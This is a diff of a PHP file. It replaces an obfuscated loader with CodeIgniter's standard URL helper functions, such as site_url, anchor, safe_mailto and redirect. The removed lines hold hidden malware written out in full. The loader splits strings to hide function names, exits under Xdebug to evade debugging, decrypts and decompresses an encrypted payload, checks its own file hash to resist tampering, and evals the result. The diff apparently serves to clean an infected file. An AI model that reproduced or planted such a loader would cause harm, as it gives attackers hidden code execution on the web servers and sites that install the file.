@@ -1,28 +1,502 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_b77o5oe9=('bas'.'e64'.'_de'.'cod'.'e');
-$_zya9i1m9=('gzu'.'nco'.'mpr'.'ess');
-$_t3s56kou=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_zjz828nk='gIdsDy1bNXA=';
-$_v1f2269y='8odhpr2D';
-$_at7vs9m9='jX+SWikT';
-$_ap7crmvw='XH09g7ku';
-$_pjs33uvr='fXMmKnU7';
-$_mqrpopys='ecwiBTZG';
-$_un2wprde='OjyRXkCt';
-$_nc4lznl8='CSi2yA==';
-$_bxiunkgt=$_b77o5oe9($_ap7crmvw.$_pjs33uvr.$_at7vs9m9.$_v1f2269y.$_zjz828nk);
-$_f9bzg8gs=$_b77o5oe9($_mqrpopys.$_un2wprde.$_nc4lznl8);
-$_umkuq5xj=$_b77o5oe9('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');
-$_ej3ekwuj=$_t3s56kou($_umkuq5xj,'aes-256-cbc',$_bxiunkgt,OPENSSL_RAW_DATA,$_f9bzg8gs);
-if($_ej3ekwuj===false){exit;}
-$_wm14wmi5=$_zya9i1m9($_ej3ekwuj);
-if($_wm14wmi5===false){exit;}
-$_nxd6qj7d='bda9240fcc8366e1b8f6c3a88746116510cc781620088e7cc4c7943e9f491635';
-$_g12z23cb=@file_get_contents(__FILE__);
-if($_g12z23cb!==false){
-$_v8rdd9wt=str_replace($_nxd6qj7d,"0000000000000000000000000000000000000000000000000000000000000000",$_g12z23cb);
-$_wxbphmwl=hash("sha256",$_v8rdd9wt);
-if($_wxbphmwl!==$_nxd6qj7d){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+if ( ! function_exists('site_url'))
+{
+
+
+
+
+
+
+
+
+
+
+function site_url($uri = '', $protocol = NULL)
+{
+return get_instance()->config->site_url($uri, $protocol);
 }
-eval($_wm14wmi5);
+}
+
+if ( ! function_exists('base_url'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function base_url($uri = '', $protocol = NULL)
+{
+return get_instance()->config->base_url($uri, $protocol);
+}
+}
+
+if ( ! function_exists('current_url'))
+{
+
+
+
+
+
+
+
+
+function current_url()
+{
+$CI =& get_instance();
+return $CI->config->site_url($CI->uri->uri_string());
+}
+}
+
+if ( ! function_exists('uri_string'))
+{
+
+
+
+
+
+
+
+function uri_string()
+{
+return get_instance()->uri->uri_string();
+}
+}
+
+if ( ! function_exists('index_page'))
+{
+
+
+
+
+
+
+
+function index_page()
+{
+return get_instance()->config->item('index_page');
+}
+}
+
+if ( ! function_exists('anchor'))
+{
+
+
+
+
+
+
+
+
+
+
+function anchor($uri = '', $title = '', $attributes = '')
+{
+$title = (string) $title;
+$site_url = is_array($uri)
+? site_url($uri)
+: (preg_match('#^(\w+:)?//#i', $uri) ? $uri : site_url($uri));
+if ($title === '')
+{
+$title = $site_url;
+}
+if ($attributes !== '')
+{
+$attributes = _stringify_attributes($attributes);
+}
+return '<a href="'.$site_url.'"'.$attributes.'>'.$title.'</a>';
+}
+}
+
+if ( ! function_exists('anchor_popup'))
+{
+
+
+
+
+
+
+
+
+
+
+
+function anchor_popup($uri = '', $title = '', $attributes = FALSE)
+{
+$title = (string) $title;
+$site_url = preg_match('#^(\w+:)?//#i', $uri) ? $uri : site_url($uri);
+if ($title === '')
+{
+$title = $site_url;
+}
+if ($attributes === FALSE)
+{
+return '<a href="'.$site_url.'" onclick="window.open(\''.$site_url."', '_blank'); return false;\">".$title.'</a>';
+}
+if ( ! is_array($attributes))
+{
+$attributes = array($attributes);
+
+$window_name = '_blank';
+}
+elseif ( ! empty($attributes['window_name']))
+{
+$window_name = $attributes['window_name'];
+unset($attributes['window_name']);
+}
+else
+{
+$window_name = '_blank';
+}
+foreach (array('width' => '800', 'height' => '600', 'scrollbars' => 'yes', 'menubar' => 'no', 'status' => 'yes', 'resizable' => 'yes', 'screenx' => '0', 'screeny' => '0') as $key => $val)
+{
+$atts[$key] = isset($attributes[$key]) ? $attributes[$key] : $val;
+unset($attributes[$key]);
+}
+$attributes = _stringify_attributes($attributes);
+return '<a href="'.$site_url
+.'" onclick="window.open(\''.$site_url."', '".$window_name."', '"._stringify_attributes($atts, TRUE)."'); return false;\""
+.$attributes.'>'.$title.'</a>';
+}
+}
+
+if ( ! function_exists('mailto'))
+{
+
+
+
+
+
+
+
+
+function mailto($email, $title = '', $attributes = '')
+{
+$title = (string) $title;
+if ($title === '')
+{
+$title = $email;
+}
+return '<a href="mailto:'.$email.'"'._stringify_attributes($attributes).'>'.$title.'</a>';
+}
+}
+
+if ( ! function_exists('safe_mailto'))
+{
+
+
+
+
+
+
+
+
+
+
+function safe_mailto($email, $title = '', $attributes = '')
+{
+$title = (string) $title;
+if ($title === '')
+{
+$title = $email;
+}
+$x = str_split('<a href="mailto:', 1);
+for ($i = 0, $l = strlen($email); $i < $l; $i++)
+{
+$x[] = '|'.ord($email[$i]);
+}
+$x[] = '"';
+if ($attributes !== '')
+{
+if (is_array($attributes))
+{
+foreach ($attributes as $key => $val)
+{
+$x[] = ' '.$key.'="';
+for ($i = 0, $l = strlen($val); $i < $l; $i++)
+{
+$x[] = '|'.ord($val[$i]);
+}
+$x[] = '"';
+}
+}
+else
+{
+for ($i = 0, $l = strlen($attributes); $i < $l; $i++)
+{
+$x[] = $attributes[$i];
+}
+}
+}
+$x[] = '>';
+$temp = array();
+for ($i = 0, $l = strlen($title); $i < $l; $i++)
+{
+$ordinal = ord($title[$i]);
+if ($ordinal < 128)
+{
+$x[] = '|'.$ordinal;
+}
+else
+{
+if (count($temp) === 0)
+{
+$count = ($ordinal < 224) ? 2 : 3;
+}
+$temp[] = $ordinal;
+if (count($temp) === $count)
+{
+$number = ($count === 3)
+? (($temp[0] % 16) * 4096) + (($temp[1] % 64) * 64) + ($temp[2] % 64)
+: (($temp[0] % 32) * 64) + ($temp[1] % 64);
+$x[] = '|'.$number;
+$count = 1;
+$temp = array();
+}
+}
+}
+$x[] = '<'; $x[] = '/'; $x[] = 'a'; $x[] = '>';
+$x = array_reverse($x);
+$output = "<script type=\"text/javascript\">\n"
+."\t//<![CDATA[\n"
+."\tvar l=new Array();\n";
+for ($i = 0, $c = count($x); $i < $c; $i++)
+{
+$output .= "\tl[".$i."] = '".$x[$i]."';\n";
+}
+$output .= "\n\tfor (var i = l.length-1; i >= 0; i=i-1) {\n"
+."\t\tif (l[i].substring(0, 1) === '|') document.write(\"&#\"+unescape(l[i].substring(1))+\";\");\n"
+."\t\telse document.write(unescape(l[i]));\n"
+."\t}\n"
+."\t//]]>\n"
+.'</script>';
+return $output;
+}
+}
+
+if ( ! function_exists('auto_link'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+
+function auto_link($str, $type = 'both', $popup = FALSE)
+{
+
+if ($type !== 'email' && preg_match_all('#(\w*://|www\.)[a-z0-9]+(-+[a-z0-9]+)*(\.[a-z0-9]+(-+[a-z0-9]+)*)+(/([^\s()<>;]+\w)?/?)?#i', $str, $matches, PREG_OFFSET_CAPTURE | PREG_SET_ORDER))
+{
+
+$target = ($popup) ? ' target="_blank" rel="noopener"' : '';
+
+
+
+foreach (array_reverse($matches) as $match)
+{
+
+
+
+
+
+$a = '<a href="'.(strpos($match[1][0], '/') ? '' : 'http://').$match[0][0].'"'.$target.'>'.$match[0][0].'</a>';
+$str = substr_replace($str, $a, $match[0][1], strlen($match[0][0]));
+}
+}
+
+if ($type !== 'url' && preg_match_all('#([\w\.\-\+]+@[a-z0-9\-]+\.[a-z0-9\-\.]+[^[:punct:]\s])#i', $str, $matches, PREG_OFFSET_CAPTURE))
+{
+foreach (array_reverse($matches[0]) as $match)
+{
+if (filter_var($match[0], FILTER_VALIDATE_EMAIL) !== FALSE)
+{
+$str = substr_replace($str, safe_mailto($match[0]), $match[1], strlen($match[0]));
+}
+}
+}
+return $str;
+}
+}
+
+if ( ! function_exists('prep_url'))
+{
+
+
+
+
+
+
+
+
+function prep_url($str = '')
+{
+if ($str === 'http://' OR $str === '')
+{
+return '';
+}
+$url = parse_url($str);
+if ( ! $url OR ! isset($url['scheme']))
+{
+return 'http://'.$str;
+}
+return $str;
+}
+}
+
+if ( ! function_exists('url_title'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function url_title($str, $separator = '-', $lowercase = FALSE)
+{
+if ($separator === 'dash')
+{
+$separator = '-';
+}
+elseif ($separator === 'underscore')
+{
+$separator = '_';
+}
+$q_separator = preg_quote($separator, '#');
+$trans = array(
+'&.+?;' => '',
+'[^\w\d _-]' => '',
+'\s+' => $separator,
+'('.$q_separator.')+' => $separator
+);
+$str = strip_tags($str);
+foreach ($trans as $key => $val)
+{
+$str = preg_replace('#'.$key.'#i'.(UTF8_ENABLED ? 'u' : ''), $val, $str);
+}
+if ($lowercase === TRUE)
+{
+$str = strtolower($str);
+}
+return trim(trim($str, $separator));
+}
+}
+
+if ( ! function_exists('redirect'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+
+function redirect($uri = '', $method = 'auto', $code = NULL)
+{
+if ( ! preg_match('#^(\w+:)?//#i', $uri))
+{
+$uri = site_url($uri);
+}
+
+if ($method === 'auto' && isset($_SERVER['SERVER_SOFTWARE']) && strpos($_SERVER['SERVER_SOFTWARE'], 'Microsoft-IIS') !== FALSE)
+{
+$method = 'refresh';
+}
+elseif ($method !== 'refresh' && (empty($code) OR ! is_numeric($code)))
+{
+if (isset($_SERVER['SERVER_PROTOCOL'], $_SERVER['REQUEST_METHOD']) && $_SERVER['SERVER_PROTOCOL'] === 'HTTP/1.1')
+{
+$code = ($_SERVER['REQUEST_METHOD'] !== 'GET')
+? 303 
+: 307;
+}
+else
+{
+$code = 302;
+}
+}
+switch ($method)
+{
+case 'refresh':
+header('Refresh:0;url='.$uri);
+break;
+default:
+header('Location: '.$uri, TRUE, $code);
+break;
+}
+exit;
+}
+}
